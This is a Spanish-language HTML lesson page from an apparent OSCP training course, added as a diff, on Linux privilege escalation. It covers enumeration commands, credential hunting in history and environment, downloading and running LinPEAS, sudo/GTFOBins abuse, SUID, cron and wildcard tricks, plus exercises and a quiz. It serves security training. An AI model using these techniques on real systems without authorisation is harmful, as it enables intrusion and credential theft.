@@ -1,0 +1,142 @@
+<!doctype html>
+<html lang="es"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Escalada en Linux · OSCP Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css"><script src="assets/app.js" defer></script>
+</head>
+<body data-page="m10"><main>
+<div class="kicker">Módulo 10 · Nivel OSCP</div>
+<h1>Escalada de privilegios en Linux</h1>
+<p class="lead">Ya tienes shell como usuario normal. El objetivo ahora: convertirte en <code>root</code>. La clave es, otra vez, <b>enumerar</b> con método hasta encontrar la grieta.</p>
+<div class="toc"><b>En este módulo</b><ol>
+<li><a href="#idea">La idea: algo poderoso que tú controlas</a></li>
+<li><a href="#enum">Enumeración local automática y manual</a></li>
+<li><a href="#vias">Las vías más frecuentes</a></li>
+<li><a href="#sudo">sudo mal configurado y GTFOBins</a></li>
+<li><a href="#suid">SUID y capabilities</a></li>
+<li><a href="#cron">Tareas cron y rutas escribibles</a></li>
+<li><a href="#kernel">Kernel y servicios</a></li>
+<li><a href="#practica">Prácticas y cuestionario</a></li>
+</ol></div>
+
+<h2 id="idea">1. La idea central</h2>
+<div class="box analogy"><span class="t">El empleado con una llave de más</span>Eres un empleado normal, pero descubres que puedes usar una máquina del almacén que, por error, arranca con la tarjeta del director. No “hackeas” nada: aprovechas un permiso mal dado. Escalar privilegios en Linux es encontrar <b>algo que se ejecuta como root pero que tú puedes influir o controlar</b>.</div>
+<figure class="diagram">
+<svg viewBox="0 0 760 170" role="img" aria-label="Fuentes de escalada">
+<rect class="b5" x="300" y="10" width="160" height="44" rx="10"/><text x="380" y="37" text-anchor="middle" font-weight="700">root</text>
+<g font-size="12" text-anchor="middle">
+<rect class="b3" x="10" y="100" width="130" height="50" rx="8"/><text x="75" y="122" font-weight="700">sudo</text><text x="75" y="138">permisos de más</text>
+<rect class="b3" x="155" y="100" width="130" height="50" rx="8"/><text x="220" y="122" font-weight="700">SUID</text><text x="220" y="138">binario con -s</text>
+<rect class="b3" x="300" y="100" width="130" height="50" rx="8"/><text x="365" y="122" font-weight="700">cron</text><text x="365" y="138">script editable</text>
+<rect class="b3" x="445" y="100" width="130" height="50" rx="8"/><text x="510" y="122" font-weight="700">servicio</text><text x="510" y="138">mal configurado</text>
+<rect class="b3" x="590" y="100" width="160" height="50" rx="8"/><text x="670" y="122" font-weight="700">kernel / credenciales</text><text x="670" y="138">exploit o reutilización</text>
+</g>
+<path class="ln" d="M75 100 V75 H380 V56 M220 100 V75 M365 100 V75 M510 100 V75 M670 100 V75 H380"/>
+</svg></figure>
+
+<h2 id="enum">2. Enumeración local</h2>
+<p>Primero a mano (entiendes lo que ves), luego con un script que no se te escape nada.</p>
+<pre>id; sudo -l                 <span class="cm"># ¿soy de algún grupo interesante? ¿puedo usar sudo?</span>
+uname -a; cat /etc/os-release   <span class="cm"># versión de kernel y distro</span>
+find / -perm -4000 -type f 2>/dev/null    <span class="cm"># binarios SUID</span>
+getcap -r / 2>/dev/null     <span class="cm"># capabilities</span>
+cat /etc/crontab; ls -la /etc/cron.*      <span class="cm"># tareas programadas</span>
+ps aux | grep root          <span class="cm"># qué corre como root</span>
+ss -tulpn                   <span class="cm"># servicios internos (solo localhost)</span>
+ls -la /home/*; ls -la ~    <span class="cm"># archivos de usuarios</span>
+cat ~/.bash_history; env    <span class="cm"># historial y variables (credenciales)</span>
+find / -writable -type d 2>/dev/null       <span class="cm"># dónde puedo escribir</span></pre>
+<div class="box def"><span class="t">Scripts de enumeración</span><b>LinPEAS</b> (el más completo), <b>linux-smart-enumeration (lse.sh)</b> y <b>pspy</b> (ve procesos que arrancan sin ser root, ideal para cron ocultos). Pásalos con un servidor web (módulo 8) y ejecútalos desde <code>/tmp</code>.</div>
+<div class="term" data-title="linpeas resalta lo interesante"><script type="text/plain">
+$ cd /tmp && wget http://192.168.45.200/linpeas.sh && chmod +x linpeas.sh
+$ ./linpeas.sh | tee linpeas.out
+...
+[+] Checking sudo -l
+  User www-data may run the following commands:
+    (root) NOPASSWD: /usr/bin/find
+...
+// find como root sin contraseña: vía directa (ver sección sudo/GTFOBins)
+</script></div>
+
+<h2 id="vias">3. Las vías más frecuentes (resumen)</h2>
+<div class="tbl"><table>
+<tr><th>Vía</th><th>Qué buscar</th><th>Frecuencia OSCP</th></tr>
+<tr><td>sudo mal configurado</td><td><code>sudo -l</code> permite ejecutar programas como root</td><td>★★★★★</td></tr>
+<tr><td>Credenciales reutilizadas</td><td>Contraseñas en archivos, historial, config de la web</td><td>★★★★★</td></tr>
+<tr><td>SUID/SGID peculiares</td><td>Binario con SUID que permite leer/escribir/ejecutar</td><td>★★★★</td></tr>
+<tr><td>Cron + ruta escribible</td><td>Script que root ejecuta y tú puedes modificar</td><td>★★★</td></tr>
+<tr><td>Grupos peligrosos</td><td><code>docker</code>, <code>lxd</code>, <code>disk</code>, <code>adm</code></td><td>★★★</td></tr>
+<tr><td>Servicios internos</td><td>Algo escuchando solo en localhost con credenciales débiles</td><td>★★</td></tr>
+<tr><td>Exploit de kernel</td><td>Kernel viejo con CVE conocido</td><td>★★ (último recurso)</td></tr>
+</table></div>
+
+<h2 id="sudo">4. sudo mal configurado y GTFOBins</h2>
+<div class="box def"><span class="t">GTFOBins</span>Web (<a href="https://gtfobins.github.io" target="_blank" rel="noopener">gtfobins.github.io</a>) que recopila cómo programas legítimos de Unix pueden “abusarse” para leer archivos, escribir o ejecutar una shell <b>cuando se lanzan con privilegios</b> (sudo, SUID, capabilities). Es tu primera parada tras un <code>sudo -l</code>.</div>
+<div class="box analogy"><span class="t">La función oculta</span>Muchos programas tienen una opción para “ejecutar un comando” (los editores, <code>find</code>, <code>awk</code>, <code>vim</code>, <code>less</code>…). Si el programa corre como root, ese comando también. Es como descubrir que la fotocopiadora tiene un modo que abre la caja fuerte.</div>
+<p>Ejemplo conceptual: si <code>sudo -l</code> dice que puedes ejecutar <code>less</code> como root, dentro de <code>less</code> existe la orden para abrir una shell, y esa shell será de root. GTFOBins te da la sintaxis exacta para cada binario. <b>No memorices</b>: entiende el patrón y consulta la web.</p>
+<div class="box exam"><span class="t">Flujo</span>1) <code>sudo -l</code> → 2) anota cada binario permitido → 3) búscalo en GTFOBins → 4) sigue la receta “Sudo”. Si no aparece, piensa si ese binario puede leer o sobrescribir un archivo clave (p. ej. <code>/etc/passwd</code> o <code>/etc/shadow</code>).</div>
+
+<h2 id="suid">5. SUID y capabilities</h2>
+<p>Repaso del módulo 1: un binario SUID (<code>-rwsr-xr-x</code>) se ejecuta con los permisos de su dueño (normalmente root).</p>
+<ol class="steps">
+<li>Lista los SUID: <code>find / -perm -4000 -type f 2>/dev/null</code>.</li>
+<li>Compara con una lista de SUID “normales” (passwd, sudo, mount…). Lo que sobre es sospechoso.</li>
+<li>Busca el binario raro en GTFOBins (sección “SUID”).</li>
+<li>Si es un binario propio del sistema (ej. un programa a medida), revisa qué hace: ¿llama a otro programa sin ruta absoluta? ¿lee un archivo que tú controlas?</li>
+</ol>
+<div class="box def"><span class="t">Capabilities</span>Permisos finos que dan a un binario “trocitos” de los poderes de root sin ser SUID completo. <code>getcap -r / 2>/dev/null</code>. Por ejemplo, un binario con <code>cap_setuid</code> puede cambiarse a root. También están en GTFOBins.</div>
+
+<h2 id="cron">6. Tareas cron y rutas escribibles</h2>
+<p>Si root ejecuta un script cada pocos minutos y <b>tú puedes modificar ese script</b> (o un archivo que use), le añades tus instrucciones y esperas a que se ejecute como root.</p>
+<div class="tbl"><table>
+<tr><th>Variante</th><th>Qué buscar</th></tr>
+<tr><td>Script editable</td><td>El <code>.sh</code> del cron tiene permisos de escritura para tu usuario/grupo</td></tr>
+<tr><td>Wildcard injection</td><td>El cron usa comodines (<code>*</code>) sobre archivos que tú puedes crear (p. ej. <code>tar *</code>)</td></tr>
+<tr><td>PATH relativo</td><td>El script llama a un comando sin ruta y tú puedes poner uno falso antes en el PATH</td></tr>
+</table></div>
+<div class="box tip"><span class="t">pspy</span>Muchos cron no aparecen en <code>/etc/crontab</code> (están en el crontab de root). <b>pspy</b> te deja ver procesos que arrancan en tiempo real sin ser root: así descubres el cron oculto.</div>
+
+<h2 id="kernel">7. Kernel y servicios internos</h2>
+<ul>
+<li><b>Kernel</b>: <code>uname -r</code> → busca exploits para esa versión (p. ej. familias conocidas). Úsalo como <b>último recurso</b>: puede colgar la máquina.</li>
+<li><b>Servicios internos</b>: <code>ss -tulpn</code> muestra servicios que solo escuchan en <code>127.0.0.1</code> (una base de datos, un panel). A veces corren como root y tienen credenciales débiles. Para alcanzarlos desde tu Kali necesitarás <b>túneles</b> (módulo 13).</li>
+<li><b>Grupos</b>: si estás en <code>docker</code>, <code>lxd</code> o <code>disk</code>, hay técnicas conocidas para leer el disco o montar un contenedor privilegiado y salir como root.</li>
+</ul>
+
+<h2 id="practica">Prácticas</h2>
+<div class="box tip"><span class="t">Dónde practicar</span>TryHackMe “Linux PrivEsc” y “Linux PrivEsc Arena”. La web GTFOBins para entender cada binario. Proving Grounds para máquinas tipo examen.</div>
+<details class="sol"><summary><span class="pill lv1">Fácil</span> Primer vistazo</summary>
+<p class="task">Acabas de entrar como <code>www-data</code>. Escribe los 3 comandos que ejecutarías primero.</p>
+<p><b>Solución:</b> <code>id</code>, <code>sudo -l</code>, <code>uname -a</code>. Luego SUID y cron. (No hay una única respuesta, pero estos tres dan muchísima información rápida.)</p></details>
+<details class="sol"><summary><span class="pill lv2">Media</span> Interpreta sudo -l</summary>
+<pre>User bob may run the following commands on web01:
+    (root) NOPASSWD: /usr/bin/vim /etc/apache2/sites-enabled/000.conf</pre>
+<p class="task">¿Es explotable?</p>
+<p><b>Solución:</b> Sí. <code>vim</code> permite ejecutar comandos del sistema desde su interfaz, y aquí corre como root. Al editar ese archivo con vim como root, puedes lanzar una shell de root desde dentro del editor (receta exacta en GTFOBins → vim → Sudo). Mitigación: no dar sudo sobre editores; usar <code>sudoedit</code> con restricciones.</p></details>
+<details class="sol"><summary><span class="pill lv2">Media</span> SUID sospechoso</summary>
+<pre>-rwsr-xr-x 1 root root 1.1M /usr/bin/find
+-rwsr-xr-x 1 root root  27K /usr/bin/passwd</pre>
+<p class="task">¿Cuál investigarías?</p>
+<p><b>Solución:</b> <code>find</code>. <code>passwd</code> con SUID es normal (necesita escribir en shadow). <code>find</code> con SUID no es habitual y en GTFOBins tiene una receta para ejecutar comandos como el dueño (root). Lo buscarías ahí.</p></details>
+<details class="sol"><summary><span class="pill lv3">Reto</span> Cron oculto</summary>
+<p class="task"><code>/etc/crontab</code> no muestra nada útil, pero sospechas que root ejecuta algo cada minuto. ¿Cómo lo confirmas y qué buscarías después?</p>
+<p><b>Solución:</b> ejecutas <b>pspy</b> y observas los procesos que arrancan periódicamente como UID 0. Si ves que root ejecuta, p. ej., <code>/opt/scripts/backup.sh</code>, compruebas sus permisos con <code>ls -l</code>. Si puedes escribir en ese archivo (o en un directorio que use con comodines), añades tus instrucciones y, al siguiente ciclo, se ejecutarán como root. Siempre: captura de pantalla de pspy y del antes/después para el reporte.</p></details>
+
+<div class="quiz" data-id="q10"></div>
+<script>
+window.QUIZ = { q10: { title: "Cuestionario · PrivEsc Linux", qs: [
+ {q:"¿Cuál es el objetivo de la escalada en Linux?", o:["Entrar por SSH","Convertirse en root","Escanear puertos","Crackear la SAM"], a:1, e:"Llegar a root (UID 0)."},
+ {q:"¿Qué comando muestra qué puedes ejecutar como root con sudo?", t:1, a:["sudo -l"], e:"sudo -l."},
+ {q:"¿Qué web indica cómo abusar de binarios con privilegios?", o:["Exploit-DB","GTFOBins","CVE Details","Shodan"], a:1, e:"GTFOBins."},
+ {q:"Un binario SUID se ejecuta con permisos de…", o:["Quien lo lanza","Su dueño","root siempre","El grupo www-data"], a:1, e:"De su dueño (a menudo root)."},
+ {q:"¿Qué comando lista binarios SUID?", o:["find / -perm -4000 -type f 2>/dev/null","ls -R /","ps aux","netstat"], a:0, e:"El bit SUID es 4000."},
+ {q:"¿Qué herramienta de enumeración es la más completa?", o:["nmap","LinPEAS","Hydra","gobuster"], a:1, e:"LinPEAS."},
+ {q:"¿Qué herramienta ve procesos/cron que arrancan sin ser root?", t:1, a:["pspy"], e:"pspy."},
+ {q:"Un exploit de kernel debería usarse…", o:["Siempre primero","Como último recurso (puede colgar la máquina)","Nunca","Solo en Windows"], a:1, e:"Es arriesgado."},
+ {q:"Estás en el grupo 'docker'. Esto…", o:["No sirve de nada","Suele permitir escalar a root","Es un servicio web","Bloquea sudo"], a:1, e:"El grupo docker permite montar el disco host."},
+ {q:"¿Dónde buscarías contraseñas reutilizables?", o:["Solo en /etc/shadow","Historial, archivos de config, variables de entorno","En el kernel","En los puertos"], a:1, e:"La reutilización es muy común."},
+ {q:"capabilities se listan con…", o:["getcap -r /","lscap","capsh --list","setcap"], a:0, e:"getcap -r / 2>/dev/null."}
+]}};
+</script>
+</main></body></html>
